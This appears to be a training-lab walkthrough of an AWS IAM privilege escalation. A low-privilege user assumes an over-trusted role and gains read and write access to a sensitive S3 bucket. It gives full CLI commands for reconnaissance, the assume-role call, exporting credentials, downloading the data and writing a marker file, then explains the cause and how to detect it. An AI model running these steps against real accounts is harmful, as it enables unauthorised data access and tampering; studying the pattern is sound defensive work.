# Guided Walkthrough: One-Hop Privilege Escalation via sts:AssumeRole to S3 Bucket

This scenario demonstrates a simple but common privilege escalation pattern where a user can assume a role that grants access to sensitive S3 buckets. The attacker starts with minimal permissions but can assume a role with S3 access permissions, allowing them to read and write to a sensitive bucket.

The vulnerability here is a trust relationship that should not exist: a low-privilege IAM user has been granted `sts:AssumeRole` on a role whose sole purpose is to access sensitive data. This pattern appears frequently in real environments when teams create service accounts with broad assume-role permissions, or when overly permissive IAM policies are applied without considering the transitivity of role access.

This is a one-hop path — a single `sts:AssumeRole` call is all that stands between the attacker and the sensitive bucket. No chaining, no credential manipulation, no policy modification required.

## The Challenge

You start as `pl-prod-sts-001-to-bucket-starting-user` — an IAM user with minimal permissions. On its own, this user cannot access any S3 buckets. Your goal is to read (and write) the contents of `pl-prod-sts-001-to-bucket-{account_id}`, a bucket containing sensitive data.

The key question is: even though this user cannot access the bucket directly, can it reach a role that can?

## Reconnaissance

First, verify who you are and confirm the limited permissions of your starting position.

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-sts-001-to-bucket-starting-user
```

Now confirm you cannot reach the target bucket directly:

```bash
aws s3 ls
# An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

Good — the starting user has no S3 permissions. Next, look for roles this user can assume. The helpful `iam:ListRoles` permission will show you all roles in the account:

```bash
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
```

You are looking for roles whose trust policies allow your user principal. You can inspect a specific role's trust policy:

```bash
aws iam get-role --role-name pl-prod-sts-001-to-bucket-access-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy will show your starting user ARN listed as a trusted principal with `sts:AssumeRole`. Now check what permissions this role has on S3:

```bash
aws iam list-role-policies --role-name pl-prod-sts-001-to-bucket-access-role
aws iam get-role-policy --role-name pl-prod-sts-001-to-bucket-access-role \
  --policy-name <policy_name>
```

The role policy grants `s3:ListBucket`, `s3:GetObject`, and `s3:PutObject` on the target bucket. You have everything you need.

## Exploitation

Assume the bucket access role with a single API call:

```bash
CREDENTIALS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-sts-001-to-bucket-access-role \
  --role-session-name attacker-session \
  --query 'Credentials' \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
```

Verify the new identity:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-sts-001-to-bucket-access-role/attacker-session
```

You are now operating as the bucket access role.

## Verification

List the contents of the target bucket:

```bash
aws s3 ls s3://pl-prod-sts-001-to-bucket-{account_id}/
# 2024-01-01 00:00:00       1234 sensitive-data.txt
```

Download the sensitive file:

```bash
aws s3 cp s3://pl-prod-sts-001-to-bucket-{account_id}/sensitive-data.txt /tmp/sensitive-data.txt
cat /tmp/sensitive-data.txt
```

Confirm write access:

```bash
echo "attacker was here" | aws s3 cp - s3://pl-prod-sts-001-to-bucket-{account_id}/demo-test-file.txt
# upload: - to s3://pl-prod-sts-001-to-bucket-{account_id}/demo-test-file.txt
```

You have read and write access to the sensitive bucket.

## What Happened

The starting user had `sts:AssumeRole` permission explicitly granting access to `pl-prod-sts-001-to-bucket-access-role`. That role was configured with S3 access policies scoped to the sensitive bucket. Because IAM evaluates the trust relationship (who can assume the role) separately from the permission policies (what the role can do), the starting user effectively inherited all of the role's S3 permissions through a single API call.

In real environments, this pattern emerges when developers create service roles for legitimate purposes (automated data processing, reporting pipelines, backup jobs) and then grant assume-role access too broadly — to entire teams, to all users in an account, or to automation accounts that turn out to be accessible to more people than intended. A CSPM tool performing graph-based path analysis should detect that a low-privilege principal can transitively reach sensitive data through role assumption, even without directly examining the bucket's resource policy.
